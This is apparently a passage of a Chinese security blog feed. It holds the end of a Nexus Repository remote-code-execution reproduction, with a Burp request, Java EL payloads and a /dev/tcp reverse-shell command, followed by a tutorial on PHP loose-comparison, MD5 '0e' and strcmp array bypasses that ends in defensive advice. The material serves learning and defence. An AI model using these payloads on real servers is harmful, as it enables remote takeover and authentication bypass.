<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675415025383-ac23cfee-6e14-4790-969b-1924318227e6.png" alt="1675415025383-ac23cfee-6e14-4790-969b-1924318227e6"></p>
<h1 id="六、漏洞复现"><a href="#六、漏洞复现" class="headerlink" title="六、漏洞复现"></a>六、漏洞复现</h1><p>访问：<a href="http://ip:8081/">http://ip:8081</a> 进入登录页面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675415170857-3d425d22-e673-4d1c-8869-96e125858cf1.png" alt="1675415170857-3d425d22-e673-4d1c-8869-96e125858cf1"></p>
<p>强制修改默认口令（可设置为原口令/弱口令）</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675415225164-9b00aa4b-0784-4816-880d-da5447989da0.png" alt="1675415225164-9b00aa4b-0784-4816-880d-da5447989da0"></p>
<p>使用admin/admin登录后台后，登录后使用f12找到cookie复制当前的csrf-Token</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675416403026-7ee04637-a2a3-4507-89cc-33702e2929fe.png" alt="1675416403026-7ee04637-a2a3-4507-89cc-33702e2929fe"></p>
<p>使用burp进行抓包，替换以下数据包，然后把自己的cookie和csrf-Token粘贴上去，然后发包即可看到执行了9*9</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/service/rest/beta/repositories/go/group</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.64.139:8081</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>151</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">X-Nexus-UI</span><span class="punctuation">: </span>true</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">NX-ANTI-CSRF-TOKEN</span><span class="punctuation">: </span>0.13458863892030704</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.64.139:8081</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.64.139:8081</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>NX-ANTI-CSRF-TOKEN=0.13458863892030704; NXSESSIONID=a576d9e8-10a7-4ba4-a8af-08cc63845895</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;<span class="attr">&quot;name&quot;</span>: <span class="string">&quot;internal&quot;</span>,<span class="attr">&quot;online&quot;</span>: <span class="literal">true</span>,<span class="attr">&quot;storage&quot;</span>: &#123;<span class="attr">&quot;blobStoreName&quot;</span>: <span class="string">&quot;default&quot;</span>,<span class="attr">&quot;strictContentTypeValidation&quot;</span>: <span class="literal">true</span>&#125;,<span class="attr">&quot;group&quot;</span>: &#123;<span class="attr">&quot;memberNames&quot;</span>: [<span class="string">&quot;$\\A&#123;9*9&#125;&quot;</span>]&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675417046649-3ddf1f8f-dcff-4f8a-90dc-9f0ab765f863.png" alt="1675417046649-3ddf1f8f-dcff-4f8a-90dc-9f0ab765f863"></p>
<p>把执行9*9修改为创建一个文件，进入docker中查看创建成功</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$\\A&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethods()[<span class="number">6</span>].invoke(<span class="keyword">null</span>).exec(<span class="string">&#x27;touch /tmp/success&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675651801120-40eb686c-bc9b-4cf5-8515-9d8c24309afa.png" alt="1675651801120-40eb686c-bc9b-4cf5-8515-9d8c24309afa"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675651825364-2c39b59a-b02a-402a-8621-b4a842cf42f2.png" alt="1675651825364-2c39b59a-b02a-402a-8621-b4a842cf42f2"></p>
<p>使用nc进行监听，执行反弹shell把执行写入文件的payload修改成反弹shell的命令，点击发送查看nc的监听看到返回了shell</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675651945985-faee73f0-cbaa-44fe-8997-7770edbd1b9e.png" alt="1675651945985-faee73f0-cbaa-44fe-8997-7770edbd1b9e"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$\\A&#123;<span class="string">&#x27;&#x27;</span>.getClass().forName(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).getMethods()[<span class="number">6</span>].invoke(<span class="keyword">null</span>).exec(<span class="string">&#x27;/bin/bash -c bash$IFS$9-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675652020711-d643dcd2-29fa-4f8d-becc-d6a8f900c535.png" alt="1675652020711-d643dcd2-29fa-4f8d-becc-d6a8f900c535"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1675652105168-5ef3fb21-5dc5-4e8d-b244-7d68df114c6b.png" alt="1675652105168-5ef3fb21-5dc5-4e8d-b244-7d68df114c6b"></p>
<h1 id="七、修复建议"><a href="#七、修复建议" class="headerlink" title="七、修复建议"></a>七、修复建议</h1><p>升级至最新版本</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Nexus</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP检查相等时的漏洞</title>
    <url>/post/a645df71.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、PHP弱类型-的漏洞"><a href="#一、PHP弱类型-的漏洞" class="headerlink" title="一、PHP弱类型==的漏洞"></a>一、PHP弱类型==的漏洞</h1><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p><strong>注：这些漏洞适用于所有版本的PHP</strong></p>
<p>&emsp;&emsp;先来复习一下基本的语法：php中有如下两种比较符号：两个等号和三个等号（这一点和Javascript）有些类似</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>==<span class="variable">$b</span></span><br><span class="line"><span class="variable">$a</span>===<span class="variable">$b</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们来一下php官方手册的说法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果类型转换后 <span class="variable">$a</span> 等于 <span class="variable">$b</span>，则 <span class="variable">$a</span> == <span class="variable">$b</span> 等于 <span class="literal">TRUE</span>。如果 <span class="variable">$a</span> 等于 <span class="variable">$b</span>，并且它们的类型也相同，则 <span class="variable">$a</span> === <span class="variable">$b</span> 全等 <span class="literal">TRUE</span>。</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;明确的看到，<strong>两个等于号的等于会在比较的时候进行类型转换的比较</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于 <span class="keyword">switch</span> 语句。当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对.</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;明确的写出了，如果一个数值和一个字符串比较，那么会<strong>将字符串转换为数值</strong>（而不是相反，将数值转化为字符串）</p>
<p>&emsp;&emsp;然而，php是如何将一个字符串转化为数值的呢，我们继续查看php手册</p>
<blockquote>
<p> 当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含 ‘**.<strong>’，’</strong>e<strong>’ 或 ‘</strong>E<strong>’ 并且其数字值在整型的范围之内（由 PHP_INT_MAX 所定义），该字符串将被当成 integer 来取值。其它所有情况下都被作为 float 来取值。</strong>该字符串的开始部分决定了它的值**。如果该字符串以合法的数值开始，则使用该数值。否则其值为 0（零）。合法数值由可选的正负号，后面跟着一个或多个数字（可能有小数点），再跟着可选的指数部分。指数部分由 ‘e’ 或 ‘E’ 后面跟着一个或多个数字构成。</p>
</blockquote>
<p>&emsp;&emsp;这是官方手册上面的几个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">1</span> + <span class="string">&quot;10.5&quot;</span>;                <span class="comment">// $foo is float (11.5)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">1</span> + <span class="string">&quot;-1.3e3&quot;</span>;              <span class="comment">// $foo is float (-1299)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">1</span> + <span class="string">&quot;bob-1.3e3&quot;</span>;           <span class="comment">// $foo is integer (1)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">1</span> + <span class="string">&quot;bob3&quot;</span>;                <span class="comment">// $foo is integer (1)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">1</span> + <span class="string">&quot;10 Small Pigs&quot;</span>;       <span class="comment">// $foo is integer (11)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="number">4</span> + <span class="string">&quot;10.2 Little Piggies&quot;</span>; <span class="comment">// $foo is float (14.2)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;10.0 pigs &quot;</span> + <span class="number">1</span>;          <span class="comment">// $foo is float (11)</span></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;10.0 pigs &quot;</span> + <span class="number">1.0</span>;        <span class="comment">// $foo is float (11)     </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们大概可以总结出如下的规则：当一个字符串被转换为数值时</p>
<ul>
<li><p>如果一个字符串为 “合法数字+e+合法数字”类型，将会解释为科学计数法的浮点数</p>
</li>
<li><p>如果一个字符串为 “合法数字+ 不可解释为合法数字的字符串”类型，将会被转换为该合法数字的值，后面的字符串将会被丢弃</p>
</li>
<li><p>如果一个字符串为“不可解释为合法数字的字符串+任意”类型，则被转换为0！ 为0…为0</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="string">&#x27;a&#x27;</span>==<span class="number">0</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;12a&#x27;</span>==<span class="number">12</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;1&#x27;</span>==<span class="number">1</span> <span class="comment">//true</span></span><br><span class="line"><span class="string">&#x27;1aaaa55sss66&#x27;</span>==<span class="number">1</span> <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;当然，上面的那些等式对于===都是false的，原本一些应该用===的地方误用了==，导致了可以注入的地方。</p>
<h2 id="2、示例代码1：利用转为数字后相等的漏洞"><a href="#2、示例代码1：利用转为数字后相等的漏洞" class="headerlink" title="2、示例代码1：利用转为数字后相等的漏洞"></a>2、示例代码1：利用转为数字后相等的漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>])) &#123;</span><br><span class="line">           <span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!ctype_alpha(<span class="variable">$v1</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125; <span class="comment">//ctype_alpha函数检查提供的字符串，文本中的所有字符是否都是字母，是则返回True，否则返回False，因此这里要全是字母</span></span><br><span class="line">        <span class="keyword">if</span> (!is_numeric(<span class="variable">$v2</span>) ) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125; <span class="comment">//如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，因此必须包含且只能包含数字/数字字符串</span></span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$v1</span>) != md5(<span class="variable">$v2</span>)) &#123;<span class="variable">$logined</span> = <span class="literal">false</span>;&#125;<span class="comment">//如果md5值不相等，则返回True，因此这里要返回相等的md5</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$logined</span>)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// continuue to do other things</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;login failed&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这是一个CTF的题目，非常有趣，可以看到，要求给出两字符串，一个是纯数字型，一个只能出现字符，使两个的md5哈希值相等，然而这种强碰撞在密码学上都是无法做到的。但是我们看到，最终比较两者的哈希的时候，使用的是等于 而不是 全等于 ，因此可以利用一下这个漏洞</p>
<p>&emsp;&emsp;再回头看一 <code>md5()</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> md5 ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以知道，第二个参数为true的时候，显示16位的结果，而为false和没有第二个参数时，为32位的16进制码（16位的结果是把32位的作为ASCII码进行解析）</p>
<p>&emsp;&emsp;16进制的数据中是含有e的，可以构建使得两个数字比较的，这里有一个现成的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5(<span class="string">&#x27;240610708&#x27;</span>) </span><br><span class="line"><span class="comment">//0e462097431906509019562988736854.</span></span><br><span class="line">md5(<span class="string">&#x27;QNKCDZO&#x27;</span>) </span><br><span class="line"><span class="comment">//0e830400451993494058024219903391</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到，这两个字符串一个只包含数字，一个只包含字母，虽然两个的哈希不一样，但是都是一个形式：0e 纯数字这种格式的字符串在判断相等的时候会被认为是科学计数法的数字，先做字符串到数字的转换。</p>
<p>&emsp;&emsp;转换后都成为了0的好多好多次方，都是0，相等。（大家可以自己尝试一下）因此</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5(<span class="string">&#x27;240610708&#x27;</span>)==md5(<span class="string">&#x27;QNKCDZO&#x27;</span>); <span class="comment">//True</span></span><br><span class="line">md5(<span class="string">&#x27;240610708&#x27;</span>)===md5(<span class="string">&#x27;QNKCDZO&#x27;</span>); <span class="comment">//False</span></span><br></pre></td></tr></table></figure>

<p>用===可以避免这一漏洞。</p>
<h2 id="3、示例代码2-利用-类’a’-0的漏洞"><a href="#3、示例代码2-利用-类’a’-0的漏洞" class="headerlink" title="3、示例代码2: 利用 类’a’==0的漏洞"></a>3、示例代码2: 利用 类’a’==0的漏洞</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;json&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$json</span> = json_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;json&#x27;</span>]);</span><br><span class="line">    <span class="variable">$key</span> =<span class="string">&quot;**********************&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$json</span>-&gt;key == <span class="variable">$key</span>) &#123;</span><br><span class="line">        <span class="comment">//login success ,continue</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//login failed ，return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这次这个例子是传入一个JSON的数据，JSON在RESTful的网站中是很常用的一种数据传输的格式。这个表单会把一个name为key的input的数据作为json传到服务端</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;your input&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们该如何破解？想”a”==0这个漏洞，之用我们使$json-&gt;key是一个数字类型的变量就可以，怎么做到呢？</p>
<p>&emsp;&emsp;php的<code>json_decode()</code>函数会根据json数据中的数据类型来将其转换为php中的相应类型的数据，也就是说，如果我们在json中传一个string类型，那么该变量就是string，如果传入的是number，则该变量为number。因此，我们如果传入一个数字，就可以使之相等。网页中的表单可能限制了所有的输入都是string，即使输入数字，传入的东西也是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;0&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这是一个字符串0，我们需要让他为数字类型，用burp拦截，把两个双引号去掉，变成这样即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;key&quot;</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;值得讨论的一点是，在这种方法的漏洞利用中，很难在直接表单类型的POST的数据中使用，这是为什么呢，这个和HTTP协议有关。首先，我们看一下，在POST给服务器的数据中，有几种类型，也就是HTTP header中的Content-Type：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">application/x-www-form-urlencoded</span><br><span class="line">multipart/form-data</span><br><span class="line">application/json</span><br><span class="line">application/xml</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;第一个application/x-www-form-urlencoded，是一般表单形式提交的。content-type第二个，是包含文件的表单。第三，四个，分别是json和xml，一般是js当中上传的</p>
<p>&emsp;&emsp;但是因为在直接的POST的payload当中是无法区分字符串和数字的，因为在其中并没有引号出现，举一个抓包的例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /login HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxx.com</span><br><span class="line">Content-Length: <span class="number">41</span></span><br><span class="line">Accept: application/json, text/javascript,application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">54.0</span>.<span class="number">2840.59</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-<span class="number">8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;可以看到，payload是放在http包的最后面的，而且都是以没有引号的形式传递的，并没有办法区分到底是字符串还是数字。因此，PHP将POST的数据全部保存为字符串形式，也就没有办法注入数字类型的数据了。而JSON则不一样，JSON本身是一个完整的字符串，经过解析之后可能有字符串，数字，布尔等多种类型。</p>
<h1 id="二、md5-漏洞"><a href="#二、md5-漏洞" class="headerlink" title="二、md5()漏洞"></a>二、md5()漏洞</h1><h2 id="1、数组绕过"><a href="#1、数组绕过" class="headerlink" title="1、数组绕过"></a>1、数组绕过</h2><p>&emsp;&emsp;md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632566493303-39528b9f-98fe-4c3c-accb-f289355ca08a.png" alt="img"></p>
<h2 id="2、利用-漏洞绕过"><a href="#2、利用-漏洞绕过" class="headerlink" title="2、利用==漏洞绕过"></a>2、利用==漏洞绕过</h2><p>&emsp;&emsp;利用==比较漏洞：如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的</p>
<p>&emsp;&emsp;下列的字符串的MD5值都是0e开头的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line"></span><br><span class="line">240610708</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line"></span><br><span class="line">0e开头的md5和原值：</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line"></span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line"></span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line"></span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line"></span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line"></span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<h1 id="三、strcmp漏洞"><a href="#三、strcmp漏洞" class="headerlink" title="三、strcmp漏洞"></a>三、strcmp漏洞</h1><p><strong>注：这一个漏洞适用与5.3之前版本的php</strong></p>
<p>&emsp;&emsp;我们首先看一下这个函数,这个函数是用于比较字符串的函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> strcmp ( <span class="keyword">string</span> <span class="variable">$str1</span> , <span class="keyword">string</span> <span class="variable">$str2</span> )</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。  </p>
<p>&emsp;&emsp;可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，当这个函数接受到了不符合的类型，这个函数将发生错误，但是在5.3之前的php中，显示了报错的警告信息后，将return 0 !!!! 也就是虽然报了错，但却判定其相等了。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本php的网站进行渗透测试。看一段示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$password</span>=<span class="string">&quot;***************&quot;</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>], <span class="variable">$password</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Right!!!login success&quot;</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Wrong password..&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;对于这段代码，我们能用什么办法绕过验证呢， 只要我们$_POST[‘password’]是一个数组或者一个object即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢。</p>
<p>&emsp;&emsp;其实php为了可以上传一个数组，会把结尾带一对中括号的变量，例如 xxx[]的name（就是$_POST中的key），当作一个名字为xxx的数组构造类似如下的request</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /login HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxx.com</span><br><span class="line">Content-Length: <span class="number">41</span></span><br><span class="line">Accept: application/json, text/javascript</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (X11; Linux x86_64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">54.0</span>.<span class="number">2840.59</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-<span class="number">8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">password[]=admin</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;即可使得上述代码绕过验证成功。</p>
<h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>&emsp;&emsp;这一类型的漏洞的特点主要就是利用PHP中 的类型特性来绕过验证。由于 == 和 === 有着明显的区分，因此，估计短期内PHP的作者并不会调整对于这两个符号的策略。而对于开发市场而言，随着培训机构的增多，后端程序员尤其是php后端程序员的门槛越来越低，其水平必定也是良莠不齐，这些二把刀程序员可能带来更多的此类对于特性的不当使用导致的漏洞，因此这类漏洞仍然是非常具有利用价值的。</p>
<p>&emsp;&emsp;记住保证安全的几句箴言：任何用户输入都是不可信的！对于web应用来说，前端（浏览器端）的安全限制只能起到防止一般用户的误输入行为，完全不可能对于黑帽子的行为有任何的防御作用</p>
<p>&emsp;&emsp;因此，在防御这个漏洞的过程中，保证几件事情：</p>
<ul>
<li><p>在所有可能的地方，都使用===来代替==</p>
</li>
<li><p>对于用户输入做过滤和类型检查</p>
</li>
<li><p>尽量使用新版本的php，apache</p>
</li>
<li><p>基本上就可以完美的防御这一类的漏洞。</p>
</li>
</ul>
<p>&emsp;&emsp;而对于渗透测试人员，在代码审计的过程中，对于有==，strcmp的比较也应极为敏感 。在黑盒渗透的时候也可以对于代码进行猜测，结合信息搜集过程中的一些版本特性，利用这些漏洞来绕过验证。</p>
]]></content>
      <categories>
        <category>Web安全</category>
